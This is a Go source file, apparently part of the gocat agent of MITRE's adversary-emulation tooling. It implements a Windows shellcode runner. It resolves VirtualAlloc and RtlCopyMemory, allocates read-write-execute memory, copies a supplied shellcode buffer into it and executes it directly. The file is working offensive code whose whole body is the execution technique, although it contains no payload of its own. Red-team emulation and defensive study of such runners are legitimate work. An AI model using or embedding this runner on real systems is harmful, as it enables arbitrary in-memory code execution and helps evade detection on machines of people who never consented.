// +build windows

package shellcode

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/mitre/gocat/execute"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	hKernel32      *syscall.DLL
	hNtdll         *syscall.DLL
	fpVirtualAlloc  *syscall.Proc
	fpRtlCopyMemory *syscall.Proc
)

// Runner runner
func Runner(shellcode []byte) (bool, string) {
	address, _, err := fpVirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if checkErrorMessage(err) {
		return false, execute.ERROR_PID
	}
	_, _, err = fpRtlCopyMemory.Call(address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if checkErrorMessage(err) {
		return false, execute.ERROR_PID
	}
	syscall.Syscall(address, 0, 0, 0, 0)
	return true, execute.SUCCESS_PID
}

// IsAvailable does a shellcode runner exist
func IsAvailable() bool {
	var kernel32Err error
	var ntdllErr error
	var vAllocErr error
	var rtlCopyMemErr error
	if hKernel32, kernel32Err = syscall.LoadDLL("kernel32.dll"); kernel32Err == nil {
		if fpVirtualAlloc, vAllocErr = hKernel32.FindProc("VirtualAlloc"); vAllocErr != nil {
			fmt.Printf("[-] Failed to load VirtualAlloc API: %s", vAllocErr.Error())
			return false
		}
		if hNtdll, ntdllErr = syscall.LoadDLL("ntdll.dll"); ntdllErr == nil {
			if fpRtlCopyMemory, rtlCopyMemErr = hNtdll.FindProc("RtlCopyMemory"); rtlCopyMemErr == nil {
				fmt.Printf("[+] Fetched required APIs for shellcode runner.")
				return true
			} else {
				fmt.Printf("[-] Failed to load RtlCopyMemory API: %s", rtlCopyMemErr.Error())
			}
		} else {
			fmt.Printf("[!] Failed to load NTDLL: %s", ntdllErr.Error())
		}
	} else {
		fmt.Printf("[-] Failed to load Kernel32: %s", kernel32Err.Error())
	}
	return false
}

// Check for error message
func checkErrorMessage(err error) bool {
	if err != nil && err.Error() != "The operation completed successfully." {
		println(err.Error())
		return true
	}
	return false
}
